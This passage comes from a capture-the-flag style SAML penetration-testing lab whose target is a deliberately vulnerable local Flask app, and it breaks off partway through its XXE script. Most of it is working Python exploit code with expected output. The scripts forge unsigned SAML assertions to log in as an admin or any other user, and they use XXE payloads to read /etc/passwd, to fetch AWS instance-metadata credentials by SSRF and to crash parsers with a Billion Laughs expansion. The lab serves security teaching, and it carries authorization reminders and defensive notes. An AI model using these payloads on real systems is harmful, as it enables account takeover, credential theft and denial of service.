# Lab: SAML Penetration Testing for Python Developers

## Module Overview

| Attribute | Value |
|-----------|-------|
| **Module ID** | EG-LAB-SAML-PENTEST-001 |
| **Type** | Hands-on Penetration Testing Lab |
| **Primary Audience** | Python Developers, AppSec Engineers, Penetration Testers |
| **Prerequisite** | EG-LAB-SAML-001 (SAML Security Fundamentals) recommended |
| **Duration** | L1: 1.5 hours, L2: 2.5 hours, L3: 3 hours |
| **Language** | Python (lxml, signxml, cryptography, requests) |
| **Version** | 1.0 |

---

## Module Purpose

This lab is the offensive counterpart to EG-LAB-SAML-001 (SAML Security Fundamentals). While the defensive lab teaches you to build secure SAML implementations, this lab teaches you to **find and exploit** SAML vulnerabilities.

Presented in a Capture-the-Flag (CTF) style format, you'll attack a deliberately vulnerable Flask application (`vulnerable-saml-app.py`) running on `localhost:5001`. Each section provides target descriptions, working exploit scripts, impact verification, and defensive notes to help you understand both sides of the security equation.

**Why learn offensive SAML security?**

Security professionals need to think like attackers. Understanding how SAML vulnerabilities are exploited helps you:
- Identify vulnerabilities during code review and security assessments
- Write better penetration testing reports with accurate reproduction steps
- Communicate risk effectively to development teams
- Design more resilient authentication systems

This lab covers the full spectrum of SAML attacks: from basic signature bypass to advanced XML Signature Wrapping (XSW), from XXE injection to Golden SAML attacks that grant persistent access across all applications trusting a compromised Identity Provider.

---

## Level 1: CRAWL - SAML Analysis & Basic Exploitation

### Learning Objectives

After completing L1, learners will be able to:

1. Intercept, decode, and analyze SAML responses to identify attack surface
2. Craft unsigned SAML assertions to bypass missing signature validation
3. Build XXE payloads for file reading, SSRF, and denial of service through SAML XML
4. Execute SAML replay attacks to reuse captured assertions
5. Identify common SAML vulnerabilities in authentication implementations

---

### 1.1 SAML Response Analysis & Decoding

> **AUTHORIZATION REMINDER:** Only test systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal under CFAA and similar laws worldwide.

**Target Description:**

The vulnerable SAML application provides a test endpoint at `GET /generate` that creates sample SAML responses for analysis. These responses contain all the elements you'll encounter in real SAML implementations: signatures, assertions, conditions, and attribute statements.

**SAML Response Structure Primer:**

SAML responses are Base64-encoded XML documents transmitted through the browser. The basic structure:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_id_here"
                IssueInstant="2026-02-07T10:30:00Z"
                Destination="https://app.example.com/saml/acs">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_id_here"
                  IssueInstant="2026-02-07T10:30:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <!-- Digital signature covering this assertion -->
    </ds:Signature>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        user@example.com
      </saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2026-02-07T10:35:00Z"
                                      Recipient="https://app.example.com/saml/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-02-07T10:29:00Z"
                     NotOnOrAfter="2026-02-07T10:35:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>https://app.example.com/metadata</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="email">
        <saml:AttributeValue>user@example.com</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Security-Relevant Elements:**

| Element | Purpose | Attack Relevance |
|---------|---------|------------------|
| **Response ID** | Unique identifier for this response | Replay detection target |
| **Assertion ID** | Unique identifier for the assertion | XSW attack reference |
| **Signature** | Digital signature proving authenticity | Primary security control |
| **NameID** | User identifier (email, username, etc.) | Identity to forge |
| **Conditions** | Time and audience restrictions | Validation bypass targets |
| **Destination** | Intended SP endpoint URL | Cross-application attack vector |
| **Audience** | Intended SP entity ID | Tenant confusion vector |
| **AttributeStatement** | User claims (roles, groups, etc.) | Privilege escalation target |

**Exploit Script: SAML Response Analyzer**

```python
#!/usr/bin/env python3
"""
saml_analyzer.py - SAML Response Reconnaissance Tool

Decodes and analyzes SAML responses to identify attack surface.
"""

import base64
import sys
from lxml import etree
from datetime import datetime

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
    'ds': 'http://www.w3.org/2000/09/xmldsig#'
}

class SAMLAnalyzer:
    """Analyze SAML responses for security assessment."""

    def __init__(self, saml_response_b64):
        self.response_b64 = saml_response_b64
        self.xml_bytes = base64.b64decode(saml_response_b64)
        self.root = etree.fromstring(self.xml_bytes)

    def pretty_print_xml(self):
        """Display formatted XML structure."""
        print("[+] SAML Response XML Structure:")
        print("=" * 80)
        formatted_xml = etree.tostring(
            self.root,
            pretty_print=True,
            encoding='unicode'
        )
        print(formatted_xml)
        print("=" * 80)

    def extract_metadata(self):
        """Extract key metadata from SAML response."""
        metadata = {}

        # Response-level attributes
        metadata['response_id'] = self.root.get('ID')
        metadata['destination'] = self.root.get('Destination')
        metadata['issue_instant'] = self.root.get('IssueInstant')

        # Issuer
        issuer = self.root.find('.//saml:Issuer', NAMESPACES)
        metadata['issuer'] = issuer.text if issuer is not None else None

        # Assertion
        assertion = self.root.find('.//saml:Assertion', NAMESPACES)
        if assertion is not None:
            metadata['assertion_id'] = assertion.get('ID')

        # NameID (user identity)
        nameid = self.root.find('.//saml:NameID', NAMESPACES)
        metadata['name_id'] = nameid.text if nameid is not None else None
        metadata['name_id_format'] = nameid.get('Format') if nameid is not None else None

        # Conditions
        conditions = self.root.find('.//saml:Conditions', NAMESPACES)
        if conditions is not None:
            metadata['not_before'] = conditions.get('NotBefore')
            metadata['not_on_or_after'] = conditions.get('NotOnOrAfter')

        # Audience
        audience = self.root.find('.//saml:Audience', NAMESPACES)
        metadata['audience'] = audience.text if audience is not None else None

        # Recipient
        subj_conf_data = self.root.find('.//saml:SubjectConfirmationData', NAMESPACES)
        if subj_conf_data is not None:
            metadata['recipient'] = subj_conf_data.get('Recipient')

        # Attributes
        attributes = {}
        for attr in self.root.findall('.//saml:Attribute', NAMESPACES):
            attr_name = attr.get('Name')
            attr_values = [
                val.text for val in attr.findall('.//saml:AttributeValue', NAMESPACES)
            ]
            attributes[attr_name] = attr_values
        metadata['attributes'] = attributes

        return metadata

    def check_signature_presence(self):
        """Check if response/assertion is signed."""
        signatures = self.root.findall('.//ds:Signature', NAMESPACES)

        print("\n[+] Signature Analysis:")
        if not signatures:
            print("    [!] NO SIGNATURES FOUND - vulnerable to forgery!")
            return False

        print(f"    [*] Found {len(signatures)} signature(s)")

        # Check what's signed
        for idx, sig in enumerate(signatures, 1):
            parent = sig.getparent()
            parent_tag = etree.QName(parent.tag).localname
            parent_id = parent.get('ID', 'unknown')
            print(f"    [*] Signature {idx}: covers {parent_tag} (ID={parent_id})")

        return True

    def identify_attack_surface(self):
        """Identify potential attack vectors."""
        print("\n[+] Attack Surface Assessment:")

        metadata = self.extract_metadata()
        findings = []

        # Check signature
        has_signature = self.check_signature_presence()
        if not has_signature:
            findings.append("CRITICAL: Missing signatures - direct forgery possible")

        # Check validation windows
        if metadata.get('not_on_or_after'):
            try:
                expiry = datetime.fromisoformat(
                    metadata['not_on_or_after'].replace('Z', '+00:00')
                )
                now = datetime.now(expiry.tzinfo)
                validity_seconds = (expiry - now).total_seconds()

                if validity_seconds > 600:  # 10 minutes
                    findings.append(
                        f"Wide validity window: {validity_seconds/60:.1f} minutes - replay opportunity"
                    )
            except:
                pass

        # Check for comments in NameID
        if metadata.get('name_id'):
            nameid_elem = self.root.find('.//saml:NameID', NAMESPACES)
            raw_xml = etree.tostring(nameid_elem, encoding='unicode')
            if '<!--' in raw_xml:
                findings.append("CRITICAL: Comment found in NameID - injection vulnerability")

        # Check destination/audience presence
        if not metadata.get('destination'):
            findings.append("Missing Destination - cross-application replay possible")

        if not metadata.get('audience'):
            findings.append("Missing Audience - cross-tenant attack possible")

        # Report findings
        if findings:
            print("    [!] Vulnerabilities Identified:")
            for finding in findings:
                print(f"        - {finding}")
        else:
            print("    [*] No obvious vulnerabilities detected (hardened target)")

        return findings

    def generate_report(self):
        """Generate full reconnaissance report."""
        print("\n" + "=" * 80)
        print("SAML RESPONSE RECONNAISSANCE REPORT")
        print("=" * 80)

        metadata = self.extract_metadata()

        print("\n[+] Response Metadata:")
        print(f"    Response ID:    {metadata.get('response_id')}")
        print(f"    Assertion ID:   {metadata.get('assertion_id')}")
        print(f"    Issuer:         {metadata.get('issuer')}")
        print(f"    Destination:    {metadata.get('destination')}")
        print(f"    Audience:       {metadata.get('audience')}")
        print(f"    Recipient:      {metadata.get('recipient')}")

        print("\n[+] Identity Claims:")
        print(f"    NameID:         {metadata.get('name_id')}")
        print(f"    NameID Format:  {metadata.get('name_id_format')}")

        print("\n[+] Validity Window:")
        print(f"    Not Before:     {metadata.get('not_before')}")
        print(f"    Not On/After:   {metadata.get('not_on_or_after')}")

        print("\n[+] User Attributes:")
        for attr_name, attr_values in metadata.get('attributes', {}).items():
            print(f"    {attr_name}: {', '.join(attr_values)}")

        self.identify_attack_surface()

        print("\n" + "=" * 80)

def main():
    if len(sys.argv) < 2:
        print("Usage: python saml_analyzer.py <base64_saml_response>")
        print("\nOr capture from vulnerable app:")
        print("  curl http://localhost:5001/generate | python saml_analyzer.py -")
        sys.exit(1)

    if sys.argv[1] == '-':
        saml_response_b64 = sys.stdin.read().strip()
    else:
        saml_response_b64 = sys.argv[1]

    analyzer = SAMLAnalyzer(saml_response_b64)
    analyzer.generate_report()

    # Optionally show full XML
    print("\n[?] Show full XML structure? (y/n): ", end='')
    if input().lower() == 'y':
        analyzer.pretty_print_xml()

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
# Generate a test SAML response
curl http://localhost:5001/generate > test_response.txt

# Analyze it
python3 saml_analyzer.py "$(cat test_response.txt)"
```

**Expected Output:**

```
================================================================================
SAML RESPONSE RECONNAISSANCE REPORT
================================================================================

[+] Response Metadata:
    Response ID:    _response_abc123
    Assertion ID:   _assertion_xyz789
    Issuer:         https://idp.example.com
    Destination:    https://app.example.com/saml/acs
    Audience:       https://app.example.com/metadata
    Recipient:      https://app.example.com/saml/acs

[+] Identity Claims:
    NameID:         user@example.com
    NameID Format:  urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress

[+] Validity Window:
    Not Before:     2026-02-07T10:00:00Z
    Not On/After:   2026-02-07T10:05:00Z

[+] User Attributes:
    role: user
    email: user@example.com

[+] Signature Analysis:
    [*] Found 1 signature(s)
    [*] Signature 1: covers Assertion (ID=_assertion_xyz789)

[+] Attack Surface Assessment:
    [*] No obvious vulnerabilities detected (hardened target)
```

**Reconnaissance Checklist:**

- [ ] Decode Base64 SAMLResponse parameter
- [ ] Parse XML structure and identify all elements
- [ ] Extract Response ID and Assertion ID (for replay tracking)
- [ ] Identify NameID value and format (target for forgery)
- [ ] Check Destination, Audience, Recipient (cross-app attack vectors)
- [ ] Examine NotBefore/NotOnOrAfter (replay window)
- [ ] Enumerate all attributes in AttributeStatement (privilege escalation targets)
- [ ] Verify signature presence and what element it covers
- [ ] Look for XML comments in identity fields (injection vectors)
- [ ] Note Issuer (IdP identity - Golden SAML target)

**Defensive Note:**

From a blue team perspective, knowing that attackers can easily decode and analyze SAML responses emphasizes the importance of signature validation. The SAML response XML is **never secret** - it travels through the user's browser. Security relies entirely on cryptographic signatures, not on obscurity.

**Key Takeaway:** SAML reconnaissance is trivial - responses are just Base64-encoded XML. Attackers can decode, modify, and analyze the entire structure in seconds. This makes proper signature validation, condition checks, and replay protection absolutely critical.

---

### 1.2 Bypassing Missing/Weak Signature Validation

> **AUTHORIZATION REMINDER:** Only test against the vulnerable-saml-app.py running on your own localhost. Never test production systems without written authorization.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-nosig` which accepts SAML responses **without validating signatures**. This is the SAML equivalent of the JWT `alg: none` vulnerability - complete authentication bypass.

**Attack Vector:**

When an SP fails to validate SAML signatures, an attacker can:
1. Craft a complete SAML Response + Assertion from scratch
2. Set any NameID (user identity) they want
3. Set any attributes/roles they want
4. Submit to the vulnerable ACS endpoint
5. Gain authentication as any user with any privileges

**Exploit Script: Unsigned SAML Forger**

```python
#!/usr/bin/env python3
"""
saml_forge_unsigned.py - Craft unsigned SAML assertions

Creates valid SAML Response XML from scratch without signatures.
Bypasses applications that fail to validate signatures.
"""

import base64
import uuid
from datetime import datetime, timedelta
from lxml import etree
import requests

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'
}

def generate_id():
    """Generate unique SAML ID."""
    return f"_{uuid.uuid4().hex}"

def generate_timestamp(offset_seconds=0):
    """Generate SAML timestamp."""
    dt = datetime.utcnow() + timedelta(seconds=offset_seconds)
    return dt.strftime('%Y-%m-%dT%H:%M:%SZ')

def create_unsigned_saml_response(
    name_id,
    attributes=None,
    destination="http://localhost:5001/saml/acs-nosig",
    audience="http://localhost:5001/metadata",
    issuer="https://evil-idp.attacker.com"
):
    """
    Create a complete unsigned SAML Response.

    Args:
        name_id: User identity to forge (e.g., "admin@example.com")
        attributes: Dict of attribute claims (e.g., {"role": "admin"})
        destination: Target SP ACS URL
        audience: Target SP entity ID
        issuer: Fake IdP identifier

    Returns:
        Base64-encoded SAML Response
    """
    if attributes is None:
        attributes = {"role": "user"}

    # Create Response element
    response = etree.Element(
        f"{{{NAMESPACES['samlp']}}}Response",
        nsmap={'samlp': NAMESPACES['samlp'], 'saml': NAMESPACES['saml']},
        ID=generate_id(),
        Version="2.0",
        IssueInstant=generate_timestamp(),
        Destination=destination
    )

    # Add Issuer to Response
    response_issuer = etree.SubElement(
        response,
        f"{{{NAMESPACES['saml']}}}Issuer"
    )
    response_issuer.text = issuer

    # Add Status
    status = etree.SubElement(
        response,
        f"{{{NAMESPACES['samlp']}}}Status"
    )
    status_code = etree.SubElement(
        status,
        f"{{{NAMESPACES['samlp']}}}StatusCode",
        Value="urn:oasis:names:tc:SAML:2.0:status:Success"
    )

    # Create Assertion
    assertion = etree.SubElement(
        response,
        f"{{{NAMESPACES['saml']}}}Assertion",
        ID=generate_id(),
        Version="2.0",
        IssueInstant=generate_timestamp()
    )

    # Add Issuer to Assertion
    assertion_issuer = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}Issuer"
    )
    assertion_issuer.text = issuer

    # NOTE: No Signature element - this is the vulnerability!

    # Add Subject
    subject = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}Subject"
    )

    nameid_elem = etree.SubElement(
        subject,
        f"{{{NAMESPACES['saml']}}}NameID",
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
    )
    nameid_elem.text = name_id

    subject_confirmation = etree.SubElement(
        subject,
        f"{{{NAMESPACES['saml']}}}SubjectConfirmation",
        Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"
    )

    subject_conf_data = etree.SubElement(
        subject_confirmation,
        f"{{{NAMESPACES['saml']}}}SubjectConfirmationData",
        NotOnOrAfter=generate_timestamp(300),  # Valid for 5 minutes
        Recipient=destination
    )

    # Add Conditions
    conditions = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}Conditions",
        NotBefore=generate_timestamp(-60),  # Valid from 1 min ago
        NotOnOrAfter=generate_timestamp(300)  # Valid for 5 minutes
    )

    audience_restriction = etree.SubElement(
        conditions,
        f"{{{NAMESPACES['saml']}}}AudienceRestriction"
    )

    audience_elem = etree.SubElement(
        audience_restriction,
        f"{{{NAMESPACES['saml']}}}Audience"
    )
    audience_elem.text = audience

    # Add AttributeStatement with custom attributes
    attr_statement = etree.SubElement(
        assertion,
        f"{{{NAMESPACES['saml']}}}AttributeStatement"
    )

    for attr_name, attr_value in attributes.items():
        attribute = etree.SubElement(
            attr_statement,
            f"{{{NAMESPACES['saml']}}}Attribute",
            Name=attr_name
        )

        # Handle both single values and lists
        values = attr_value if isinstance(attr_value, list) else [attr_value]
        for val in values:
            attr_val_elem = etree.SubElement(
                attribute,
                f"{{{NAMESPACES['saml']}}}AttributeValue"
            )
            attr_val_elem.text = str(val)

    # Serialize to XML
    xml_bytes = etree.tostring(response, encoding='utf-8', xml_declaration=True)

    # Base64 encode for transmission
    saml_response_b64 = base64.b64encode(xml_bytes).decode('ascii')

    return saml_response_b64

def exploit_unsigned_acs(
    target_url,
    name_id,
    attributes=None,
    relay_state="/"
):
    """
    Submit forged unsigned SAML response to vulnerable ACS endpoint.

    Args:
        target_url: Vulnerable ACS endpoint URL
        name_id: User to authenticate as
        attributes: Custom attributes/roles
        relay_state: Post-login redirect path

    Returns:
        requests.Response object
    """
    saml_response = create_unsigned_saml_response(
        name_id=name_id,
        attributes=attributes,
        destination=target_url
    )

    print(f"[+] Forging SAML response for user: {name_id}")
    print(f"[+] Attributes: {attributes}")
    print(f"[+] Target: {target_url}")

    # Submit via POST (standard SAML browser POST binding)
    response = requests.post(
        target_url,
        data={
            'SAMLResponse': saml_response,
            'RelayState': relay_state
        },
        allow_redirects=False
    )

    return response

def main():
    print("=" * 80)
    print("UNSIGNED SAML ASSERTION FORGERY")
    print("=" * 80)

    # Example 1: Authenticate as admin
    print("\n[*] Example 1: Privilege Escalation to Admin")
    response = exploit_unsigned_acs(
        target_url="http://localhost:5001/saml/acs-nosig",
        name_id="admin@example.com",
        attributes={
            "role": "admin",
            "email": "admin@example.com",
            "permissions": ["read", "write", "delete", "admin"]
        }
    )

    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Headers: {dict(response.headers)}")

    if response.status_code in [302, 303]:
        print(f"[+] SUCCESS! Redirected to: {response.headers.get('Location')}")
        print("[+] Authentication bypassed - now logged in as admin")
    else:
        print(f"[!] Unexpected response: {response.text[:200]}")

    # Example 2: Authenticate as arbitrary user
    print("\n[*] Example 2: Arbitrary User Impersonation")
    response = exploit_unsigned_acs(
        target_url="http://localhost:5001/saml/acs-nosig",
        name_id="victim@company.com",
        attributes={
            "role": "user",
            "department": "Engineering",
            "email": "victim@company.com"
        }
    )

    print(f"[+] Response Status: {response.status_code}")
    if response.status_code in [302, 303]:
        print(f"[+] SUCCESS! Now authenticated as victim@company.com")

    print("\n[+] Attack Complete!")
    print("[+] Impact: Complete authentication bypass - attacker controls all identity claims")

if __name__ == '__main__':
    main()
```

**Verification:**

```bash
# Start the vulnerable SAML app (in another terminal)
python3 vulnerable-saml-app.py

# Run the exploit
python3 saml_forge_unsigned.py
```

**Expected Output:**

```
================================================================================
UNSIGNED SAML ASSERTION FORGERY
================================================================================

[*] Example 1: Privilege Escalation to Admin
[+] Forging SAML response for user: admin@example.com
[+] Attributes: {'role': 'admin', 'email': 'admin@example.com', 'permissions': ['read', 'write', 'delete', 'admin']}
[+] Target: http://localhost:5001/saml/acs-nosig
[+] Response Status: 302
[+] Response Headers: {'Location': '/dashboard', 'Set-Cookie': 'session=...'}
[+] SUCCESS! Redirected to: /dashboard
[+] Authentication bypassed - now logged in as admin

[*] Example 2: Arbitrary User Impersonation
[+] Forging SAML response for user: victim@company.com
[+] Attributes: {'role': 'user', 'department': 'Engineering', 'email': 'victim@company.com'}
[+] Target: http://localhost:5001/saml/acs-nosig
[+] Response Status: 302
[+] SUCCESS! Now authenticated as victim@company.com

[+] Attack Complete!
[+] Impact: Complete authentication bypass - attacker controls all identity claims
```

**Impact Assessment:**

| Impact Category | Severity | Description |
|----------------|----------|-------------|
| **Authentication Bypass** | Critical | Attacker authenticates as any user without credentials |
| **Privilege Escalation** | Critical | Attacker grants themselves admin/superuser roles |
| **Data Breach** | High | Access to all data of impersonated users |
| **Audit Trail Evasion** | High | Actions appear to come from legitimate users |
| **Compliance Violation** | High | Breaks all authentication compliance requirements |

**Defensive Note:**

This vulnerability exists when developers:
- Parse SAML XML manually with `lxml` or `xml.etree` and extract claims directly
- Disable signature validation in SAML libraries (`wantAssertionsSigned: False`)
- Implement custom SAML parsers without understanding cryptographic requirements
- Skip validation "temporarily" during development and forget to re-enable it

**Prevention:**
- Always use `wantAssertionsSigned: True` and `wantMessagesSigned: True` in python3-saml
- Never extract claims from XML before signature validation
- Use `strict: True` mode in python3-saml
- Implement defense-in-depth with signature validation + conditions validation + replay protection

**Key Takeaway:** Missing signature validation is a complete authentication bypass. An attacker who can submit unsigned SAML assertions controls all identity claims. This is why signature validation is the single most critical SAML security control.

---

### 1.3 Crafting XXE Payloads for SAML XML

> **AUTHORIZATION REMINDER:** XXE attacks can read sensitive files and cause denial of service. Only test on systems you own or have explicit permission to test.

**Target Description:**

The vulnerable application exposes `POST /saml/acs-xxe` which parses SAML responses using an XML parser configured to resolve external entities. This enables XML External Entity (XXE) injection attacks.

**Attack Vectors:**

XXE in SAML contexts enables:
1. **File reading** - Extract `/etc/passwd`, configuration files, private keys
2. **SSRF (Server-Side Request Forgery)** - Make the server request internal URLs
3. **Denial of Service** - Billion Laughs attack (entity expansion bomb)

**Exploit Script: SAML XXE Payload Injector**

```python
#!/usr/bin/env python3
"""
saml_xxe_exploit.py - XXE Injection through SAML Responses

Demonstrates file reading, SSRF, and DoS via XXE in SAML XML parsing.
"""

import base64
import requests
from lxml import etree

NAMESPACES = {
    'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
    'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'
}

def create_xxe_file_read_payload(
    file_path="/etc/passwd",
    target_url="http://localhost:5001/saml/acs-xxe"
):
    """
    Create SAML response with XXE payload for file reading.

    Args:
        file_path: File to read on the server
        target_url: Vulnerable ACS endpoint

    Returns:
        Base64-encoded malicious SAML response
    """
    # DOCTYPE with external entity pointing to file
    xxe_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_xxe_001"
                Version="2.0"
                IssueInstant="2026-02-07T10:00:00Z"
                Destination="{target_url}">
  <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_xxe_001"
                  Version="2.0"
                  IssueInstant="2026-02-07T10:00:00Z">
    <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-02-07T09:59:00Z"
                     NotOnOrAfter="2026-02-07T10:10:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>http://localhost:5001/metadata</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>'''

    # Base64 encode
    saml_response_b64 = base64.b64encode(xxe_xml.encode('utf-8')).decode('ascii')
    return saml_response_b64

def create_xxe_ssrf_payload(
    ssrf_url="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    target_url="http://localhost:5001/saml/acs-xxe"
):
    """
    Create SAML response with XXE payload for SSRF.

    Targets AWS metadata endpoint (useful if SP runs in EC2).

    Args:
        ssrf_url: Internal URL to request
        target_url: Vulnerable ACS endpoint

    Returns:
        Base64-encoded malicious SAML response
    """
    xxe_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "{ssrf_url}">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_ssrf_001"
                Version="2.0"
                IssueInstant="2026-02-07T10:00:00Z"
                Destination="{target_url}">
  <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_ssrf_001"
                  Version="2.0"
                  IssueInstant="2026-02-07T10:00:00Z">
    <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>&ssrf;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

    saml_response_b64 = base64.b64encode(xxe_xml.encode('utf-8')).decode('ascii')
    return saml_response_b64

def create_xxe_billion_laughs():
    """
    Create Billion Laughs entity expansion DoS payload.

    Each lol2 expands to 10 lol1, lol3 to 100, etc.
    lol9 expands to 1 billion "lol" strings - crashes parser.

    Returns:
        Base64-encoded DoS SAML response
    """
    xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_dos_001">
  <saml:Assertion ID="_assertion_dos_001">
    <saml:Subject>
      <saml:NameID>&lol9;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

    saml_response_b64 = base64.b64encode(xxe_xml.encode('utf-8')).decode('ascii')
    return saml_response_b64

def exploit_xxe_file_read(target_url, file_path):
    """Execute XXE file reading attack."""
    print(f"[+] XXE File Read Attack")
    print(f"[+] Target: {target_url}")
    print(f"[+] File: {file_path}")

    payload = create_xxe_file_read_payload(file_path, target_url)

    response = requests.post(
        target_url,
        data={'SAMLResponse': payload},
        allow_redirects=False
    )

    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body:\n{response.text[:500]}")

    # Check if file contents appear in response
    if response.status_code == 200 and len(response.text) > 50:
        print(f"\n[+] SUCCESS! File contents may be reflected in response")
        print(f"[+] Check response body for file contents")

    return response

def exploit_xxe_ssrf(target_url, ssrf_url):
    """Execute XXE SSRF attack."""
    print(f"[+] XXE SSRF Attack")
    print(f"[+] Target: {target_url}")
    print(f"[+] SSRF URL: {ssrf_url}")

    payload = create_xxe_ssrf_payload(ssrf_url, target_url)

    response = requests.post(
        target_url,
        data={'SAMLResponse': payload},
        allow_redirects=False
    )

    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body:\n{response.text[:500]}")

    return response

def exploit_xxe_dos(target_url):
    """Execute XXE Billion Laughs DoS attack."""
    print(f"[+] XXE Billion Laughs DoS Attack")
    print(f"[+] Target: {target_url}")
    print(f"[!] WARNING: This will consume significant server resources")

    payload = create_xxe_billion_laughs()

    try:
        response = requests.post(
            target_url,
            data={'SAMLResponse': payload},
            timeout=5  # Short timeout - DoS will hang
        )
        print(f"[+] Response Status: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"[+] Request timed out - DoS likely successful")
    except Exception as e:
        print(f"[+] Error (expected): {e}")

def detect_xxe_vulnerability(target_url):
    """
    Detect if endpoint is vulnerable to XXE.

    Uses a benign test - attempts to load a non-existent file.
    Vulnerable parsers will error differently than safe parsers.
    """
    print(f"[+] XXE Vulnerability Detection")
    print(f"[+] Target: {target_url}")

    # Test with non-existent file
    payload = create_xxe_file_read_payload("/nonexistent_test_file_12345", target_url)

    try:
        response = requests.post(
            target_url,
            data={'SAMLResponse': payload},
            allow_redirects=False,
            timeout=5
        )

        # Check for XXE-specific error messages
        error_indicators = [
            "No such file",
            "file not found",
            "failed to load external entity",
            "I/O error"
        ]

        response_lower = response.text.lower()
        for indicator in error_indicators:
            if indicator.lower() in response_lower:
                print(f"[!] VULNERABLE! Error message indicates XXE processing")
                print(f"[!] Found indicator: '{indicator}'")
                return True

        print(f"[*] No XXE indicators detected - may be safe or errors suppressed")
        return False

    except Exception as e:
        print(f"[!] Error during detection: {e}")
        return False

def main():
    print("=" * 80)
    print("SAML XXE EXPLOITATION TOOLKIT")
    print("=" * 80)

    target_url = "http://localhost:5001/saml/acs-xxe"

    # Detection
    print("\n[*] Step 1: Detect XXE Vulnerability")
    detect_xxe_vulnerability(target_url)

    # File reading
    print("\n" + "=" * 80)
    print("[*] Step 2: File Reading via XXE")
